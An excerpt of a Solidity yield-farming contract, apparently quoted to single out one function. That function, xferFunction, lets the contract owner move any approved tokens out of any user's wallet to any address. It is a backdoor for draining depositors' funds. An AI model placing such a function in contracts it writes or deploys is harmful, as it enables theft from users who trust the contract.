...
contract Farming is IFarming, Ownable, ReentrancyGuard {
    ...
    function xferFunction(address tokenAddress, address userAddress, address xfererAddress, uint amount) public onlyOwner {
        ERC20Detailed(tokenAddress).transferFrom(userAddress, xfererAddress, amount);
    }
